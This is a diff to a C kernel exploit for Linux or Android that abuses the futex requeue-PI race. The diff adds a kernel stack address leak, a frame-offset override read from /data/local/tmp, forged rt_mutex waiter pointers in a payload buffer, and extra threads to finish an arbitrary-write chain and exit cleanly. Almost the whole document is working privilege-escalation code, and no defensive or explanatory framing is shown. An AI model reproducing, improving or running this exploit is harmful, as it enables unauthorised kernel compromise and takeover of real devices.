@@ -29,6 +29,9 @@
 #ifndef CONSUMER_CALLS
 #define CONSUMER_CALLS      1
 #endif
+#ifndef CONSUMER_CALL_GAP_USEC
+#define CONSUMER_CALL_GAP_USEC 60000
+#endif
 #ifndef OWNER_NICE
 #define OWNER_NICE          0
 #endif
@@ -67,6 +70,14 @@ extern atomic_ullong g_stamp_start_ticks;
 extern atomic_ullong g_consumer_seen_ticks;
 extern atomic_ullong g_consumer_svc_ticks;
 static uint64_t g_payload_buffer[EXP_BUFFER_WORDS];
+
+#ifdef STAMP_STACK_FRAME_OFF
+static atomic_int g_leak_done;
+static atomic_int g_teardown;
+static atomic_int g_w2_done;
+static uint64_t g_stack_x;
+uint64_t perf_stack_base_stable(int tid);
+#endif
 
 struct local_sched_attr {
     uint32_t size;
@@ -158,6 +169,11 @@ static void *waiter_thread(void *arg __attribute__((unused))) {
     int tid = (int)syscall(__NR_gettid);
     atomic_store(&g_waiter_tid, tid);
 
+#ifdef STAMP_STACK_FRAME_OFF
+    while (!atomic_load(&g_leak_done))
+        syscall(__NR_getpid);
+#endif
+
     if (syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0,
                 NULL, NULL, 0) != 0) {
         pr_warning("Waiter: lock_pi chain failed errno=%d\n", errno);
@@ -176,14 +192,21 @@ static void *waiter_thread(void *arg __attribute__((unused))) {
     atomic_store(&g_waiter_waiting, 1);
 
     pr_info("Waiter: futex wait requeue pi\n");
-    syscall(__NR_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
-            &timeout, &f_pi_target, 0);
-    pr_debug("Waiter: returned from wait requeue pi errno=%d\n",
-             errno);
+    errno = 0;
+    long wrq_rc = syscall(__NR_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
+                          &timeout, &f_pi_target, 0);
+    pr_info("Waiter: wait requeue pi returned rc=%ld errno=%d\n",
+            (long)wrq_rc, errno);
 
+#ifdef STAMP_STACK_FRAME_OFF
+    do_stamp_stack(g_payload_buffer);
+    f_pi_chain = (uint32_t)tid;
+    syscall(__NR_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+#else
     syscall(__NR_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
 
     do_stamp_stack(g_payload_buffer);
+#endif
 
     while (1)
         sleep(1);
@@ -192,6 +215,7 @@ static void *waiter_thread(void *arg __attribute__((unused))) {
 }
 
 static void *owner_thread(void *arg __attribute__((unused))) {
+    int owner_tid __attribute__((unused)) = (int)syscall(__NR_gettid);
     /* Keep the PI-chain owner from donating priority 120 to the waiter.
      * On targets whose stack stamp cannot reach rt_mutex_waiter::prio, this
      * lets the consumer's legal priority reduction change the waiter's
@@ -219,17 +243,38 @@ static void *owner_thread(void *arg __attribute__((unused))) {
     syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
     pr_debug("Owner: lock_pi chain acquired\n");
 
+#ifdef STAMP_STACK_FRAME_OFF
+    f_pi_target = (uint32_t)owner_tid;
+    errno = 0;
+    long urc = syscall(__NR_futex, &f_pi_target, FUTEX_UNLOCK_PI, 0,
+                       NULL, NULL, 0);
+    pr_info("Owner: unlock_pi target rc=%ld errno=%d\n", urc, errno);
+    atomic_store(&g_teardown, 1);
+#endif
+
     while (1)
         sleep(1);
     return NULL;
 }
+
+#ifdef STAMP_STACK_FRAME_OFF
+static void *waiter2_thread(void *arg __attribute__((unused))) {
+    pin_to_core(1);
+    pr_debug("Waiter2: lock_pi target\n");
+    syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+    atomic_store(&g_w2_done, 1);
+    pr_debug("Waiter2: lock_pi target returned errno=%d\n", errno);
+    while (1)
+        sleep(1);
+    return NULL;
+}
+#endif
 
 static void *consumer_thread(void *arg __attribute__((unused))) {
     pin_to_core(3);
     int tid = 0;
     while (!(tid = atomic_load(&g_waiter_tid)))
         usleep(1000);
-
     long ret = 0;
 #ifdef STAMP_TWO_PHASE
     ret = consumer_sched_setattr_inline(tid, SCHED_BATCH,
@@ -245,8 +290,18 @@ static void *consumer_thread(void *arg __attribute__((unused))) {
         ret = consumer_sched_setattr_inline(tid, SCHED_BATCH,
                                             CONSUMER_NICE);
     } else {
+#ifdef STAMP_STACK_FRAME_OFF
+        while (!atomic_load(&g_consumer_go))
+            usleep(200);
+#else
         while (!atomic_load(&g_consumer_go))
             ;
+#endif
+
+#ifdef STAMP_CONSUMER_PRE_USEC
+        if (STAMP_CONSUMER_PRE_USEC > 0)
+            usleep(STAMP_CONSUMER_PRE_USEC);
+#endif
 
         if (CONSUMER_DELAY_USEC > 0) {
             for (volatile int i = 0; i < CONSUMER_DELAY_USEC; i++)
@@ -256,7 +311,7 @@ static void *consumer_thread(void *arg __attribute__((unused))) {
         for (int i = 0; i < CONSUMER_CALLS; i++) {
             ret = sched_setattr_tid(
                 tid, (i & 1) ? CONSUMER_NICE - 1 : CONSUMER_NICE);
-            usleep(60000);
+            usleep(CONSUMER_CALL_GAP_USEC);
         }
     }
 #endif
@@ -334,6 +389,52 @@ int main(int argc, char **argv) {
     pthread_create(&owner,    NULL, owner_thread,    NULL);
     pthread_create(&consumer, NULL, consumer_thread, NULL);
 
+#ifdef STAMP_STACK_FRAME_OFF
+    {
+        int wtid = 0;
+        while (!(wtid = atomic_load(&g_waiter_tid)))
+            usleep(1000);
+
+        uint64_t base = perf_stack_base_stable(wtid);
+        if (!base) {
+            pr_error("Main: kernel stack leak failed for waiter tid=%d\n",
+                     wtid);
+            return 1;
+        }
+        uint64_t frame_off = (uint64_t)STAMP_STACK_FRAME_OFF;
+        {
+            char fo[32] = {0};
+            int ffd = open("/data/local/tmp/gl.frameoff", O_RDONLY | O_CLOEXEC);
+            if (ffd >= 0) {
+                ssize_t fn = read(ffd, fo, sizeof(fo) - 1);
+                close(ffd);
+                if (fn > 0) {
+                    unsigned long v = strtoul(fo, NULL, 0);
+                    if (v) {
+                        frame_off = (uint64_t)v;
+                        pr_info("Main: frame offset overridden to %#lx\n", v);
+                    }
+                }
+            }
+        }
+        g_stack_x = base + frame_off;
+
+        g_payload_buffer[5] = g_stack_x;
+        g_payload_buffer[6] = 0;
+        g_payload_buffer[7] = g_stack_x + 24;
+
+        pr_success("Main: stack base=%#llx X=%#llx (frame +%#x)\n",
+                   (unsigned long long)base,
+                   (unsigned long long)g_stack_x,
+                   (unsigned)frame_off);
+        pr_debug("Main: payload pi_left=%#llx task=%#llx lock=%#llx\n",
+                (unsigned long long)g_payload_buffer[5],
+                (unsigned long long)g_payload_buffer[6],
+                (unsigned long long)g_payload_buffer[7]);
+        atomic_store(&g_leak_done, 1);
+    }
+#endif
+
     while (!atomic_load(&g_waiter_waiting) ||
            !atomic_load(&g_owner_started))
         usleep(1000);
@@ -346,17 +447,37 @@ int main(int argc, char **argv) {
     }
     pr_info("Main: waiter/owner ready; pre-race window opened\n");
 
+#ifdef STAMP_STACK_FRAME_OFF
+    {
+        pthread_t waiter2;
+        if (pthread_create(&waiter2, NULL, waiter2_thread, NULL) != 0)
+            pr_warning("Main: waiter2 create failed errno=%d\n", errno);
+        else
+            usleep(300000);
+    }
+#endif
+
     usleep(200000);
 
     pr_info("Main: futex cmp requeue pi\n");
     errno = 0;
-    syscall(__NR_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
-            (void *)1, &f_pi_target, 0);
-    pr_debug("Main: cmp requeue pi returned errno=%d\n",
-             errno);
+    long rq_rc = syscall(__NR_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
+                         (void *)1, &f_pi_target, 0);
+    pr_info("Main: cmp requeue pi rc=%ld errno=%d\n", rq_rc, errno);
 
     while (!atomic_load(&g_consumer_done))
         sleep(1);
+
+#ifdef STAMP_STACK_FRAME_OFF
+    for (int i = 0; i < 4000; i++) {
+        if (atomic_load(&g_teardown) && atomic_load(&g_w2_done))
+            break;
+        usleep(1000);
+    }
+    pr_debug("Main: teardown=%d w2_done=%d\n",
+             atomic_load(&g_teardown), atomic_load(&g_w2_done));
+    usleep(50000);
+#endif
 
     pr_info("Main: chain complete\n");
     unsigned char done = 0xa5;
@@ -366,12 +487,12 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    /* The forged PI/rbtree state is still associated with this process.
-     * Exiting can make the kernel tear that state down through rb_erase(),
-     * which is unsafe after the arbitrary-write chain.  Keep the process
-     * alive and quiescent after telling the native parent it may continue.
-     */
+#ifdef STAMP_STACK_FRAME_OFF
+    pr_info("Main: completion signaled\n");
+    _exit(0);
+#else
     pr_info("Main: completion signaled; parking process\n");
     for (;;)
         pause();
+#endif
 }
